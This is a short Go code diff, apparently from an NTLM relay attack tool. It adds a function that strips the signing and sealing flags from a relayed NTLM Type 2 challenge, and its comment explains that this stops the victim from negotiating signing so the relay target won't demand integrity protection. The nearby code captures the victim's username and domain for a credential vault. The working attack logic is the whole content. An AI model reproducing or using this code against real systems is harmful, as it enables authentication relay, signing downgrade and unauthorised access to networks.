@@ -73,6 +73,24 @@ func relayExtractType2Challenge(type2 []byte) []byte {
 	return challenge
 }
 
+// relayStripType2Signing clears NEGOTIATE_SIGN (0x10), NEGOTIATE_SEAL (0x20),
+// and NEGOTIATE_ALWAYS_SIGN (0x8000) from the Type 2 NegotiateFlags at offset
+// 20. This prevents the victim from negotiating signing in the Type 3, so the
+// relay target won't require integrity protection on subsequent operations.
+func relayStripType2Signing(type2 []byte) []byte {
+	if len(type2) < 24 {
+		return type2
+	}
+	out := make([]byte, len(type2))
+	copy(out, type2)
+	flags := binary.LittleEndian.Uint32(out[20:24])
+	flags &^= 0x00000010 // NEGOTIATE_SIGN
+	flags &^= 0x00000020 // NEGOTIATE_SEAL
+	flags &^= 0x00008000 // NEGOTIATE_ALWAYS_SIGN
+	binary.LittleEndian.PutUint32(out[20:24], flags)
+	return out
+}
+
 // relayExtractType3Info extracts username and domain from an NTLM Type 3 message
 // for logging and credential vault registration.
 func relayExtractType3Info(type3 []byte) (user, domain string) {
